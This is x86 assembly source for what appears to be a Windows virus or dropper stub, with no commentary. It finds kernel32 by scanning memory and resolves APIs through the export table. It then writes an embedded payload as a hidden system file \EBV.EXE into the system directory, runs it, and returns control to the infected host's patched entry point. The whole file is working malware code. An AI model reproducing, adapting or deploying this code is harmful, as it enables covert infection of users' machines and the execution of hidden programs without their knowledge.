Public _entry_code_start, _entry_code_end, _host_entry, _size_of_main_file

Extrn _main:Proc
Extrn ExitProcess:Proc

.386
.model flat
.data
_entry_code_start:
        pushfd
        pushad


        CALL over_SEH_handler                   ; push offset of SEH handler

        mov esp, fs:[0]                         ; restore ESP
        JMP return_to_host                      ; jump back to host

over_SEH_handler:
        push dword ptr fs:[0]                   ; save old SEH pointer
        mov fs:[0], esp                         ; set new SEH frame


        call next
next:
        pop ebp
        sub ebp, (next - _entry_code_start)


        mov eax, [esp+11*4]
        and eax, 0FFFF0000h

search_kernel32:
        cmp word ptr [eax], "ZM"
        JE found_kernel32
        sub eax, 10000h
        JMP search_kernel32

found_kernel32:
        mov [ebp + kernel32 - _entry_code_start], eax


        push 260
        lea eax, [ebp + path - _entry_code_start]
        push eax
        lea edi, [ebp + GetSystemDirectoryA - _entry_code_start]
        CALL get_api
        or eax, eax
        JZ return_to_host

        lea eax, [ebp + filename - _entry_code_start]
        push eax
        lea eax, [ebp + path - _entry_code_start]
        push eax
        lea edi, [ebp + lstrcatA - _entry_code_start]
        CALL get_api

        push 0                                  ; template file
        push 7                                  ; readonly, hidden, system
        push 1                                  ; create new file, fail if
                                                ; it already exists
        push 0                                  ; security attributes
        push 0                                  ; share mode
        push 40000000h                          ; generic_write access
        lea eax, [ebp + path - _entry_code_start]
        push eax                                ; filename
        lea edi, [ebp + CreateFileA - _entry_code_start]
        CALL get_api
        inc eax
        JZ return_to_host
        dec eax

        push eax                                ; save filehandle

        push 0                                  ; overlapped structure
        lea ebx, [ebp + tmp - _entry_code_start] ; number of bytes written
        push ebx
        db 68h                                  ; push imm32
_size_of_main_file dd ?                         ; size to write
        lea ebx, [ebp + _entry_code_end - _entry_code_start] ; write buffer
        push ebx
        push eax                                ; filehandle
        lea edi, [ebp + WriteFile - _entry_code_start]
        CALL get_api

        lea edi, [ebp + CloseHandle - _entry_code_start]
        CALL get_api                            ; close file again


        sub esp, 21*4
        mov edi, esp

        push edi                                ; ptr to PROCESS_INFORMATION
        xor eax, eax                            ; init structure with zeros
        stosd
        stosd
        stosd
        stosd

        push edi                                ; ptr to STARTUPINFO
        mov eax,17*4                            ; size of STARTUPINFO struc
        stosd
        xor eax, eax                            ; init structure with zeros
        mov ecx, 16
        rep stosd

        push eax                                ; ptr to current directory
        push eax                                ; ptr to enviroment block
        push eax                                ; creation flags
        push eax                                ; inheritance flag
        push eax                                ; thread security attributes
        push eax                                ; process security attributes
        push eax                                ; ptr to commandline
        lea eax, [ebp + path - _entry_code_start]
        push eax                                ; filename
        lea edi, [ebp + CreateProcessA - _entry_code_start]
        CALL get_api

        add esp, 21*4


return_to_host:
        pop dword ptr fs:[0]                    ; remove SEH
        pop eax

        popad
        popfd

        db 0B8h                                 ; mov eax, imm32
_host_entry dd ?
        JMP eax


get_api:
        mov eax, [ebp + kernel32 - _entry_code_start] ; EAX=kernel32 base
        mov ebx, [eax+3Ch]                      ; EBX=PE header RVA
        add ebx, eax                            ; EBX=PE header VA
        mov ebx, [ebx+78h]                      ; EBX=export directory RVA
        add ebx, eax                            ; EBX=export directory VA
        
        xor ecx, ecx                            ; ECX=0
        mov edx, [ebx+18h]                      ; EDX=NumberOfNames
        mov esi, [ebx+20h]                      ; EDI=AddressOfNames array RVA
        add esi, eax                            ; EDI=AddressOfNames array VA

search_loop:
        pushad
        lodsd                                   ; EAX=API RVA
        xchg eax, esi
        add esi, [ebp + kernel32 - _entry_code_start]

compare_loop:
        lodsb
        scasb
        JNE try_next_api
        cmp al, 0
        JNE compare_loop

found_API:
        popad
        mov edx, [ebx+24h]                      ; EDX=AddressOfOrdinals RVA
        add edx, eax                            ; EDX=AddressOfOrdinals VA
        movzx ecx, word ptr [edx+ecx*2]         ; ECX=API ordinal
        mov edx, [ebx+1Ch]                      ; EDX=AddressOfFunctions RVA
        add edx, eax                            ; EDX=AddressOfFunctions VA
        mov edx, [edx+ecx*4]                    ; EDX=API RVA
        add eax, edx                            ; EAX=API VA
        JMP eax


try_next_api:
        popad
        inc esi
        inc esi
        inc esi
        inc esi
        inc ecx                                 ; if not, try next api
        cmp ecx, edx                            ; all APIs done ?
        JL search_loop

not_found_API:
        mov esp, fs:[0]
        JMP return_to_host                      ; restore host



filename db "\EBV.EXE", 0

GetSystemDirectoryA db "GetSystemDirectoryA", 0
lstrcatA            db "lstrcatA", 0
CreateFileA         db "CreateFileA", 0
WriteFile           db "WriteFile", 0
CloseHandle         db "CloseHandle", 0
CreateProcessA      db "CreateProcessA", 0

path db 260 dup(?)

kernel32 dd ?
tmp      dd ?

_entry_code_end:

db 10000h dup(?)

.code
start:
        call _main

        push 0
        call ExitProcess
end start
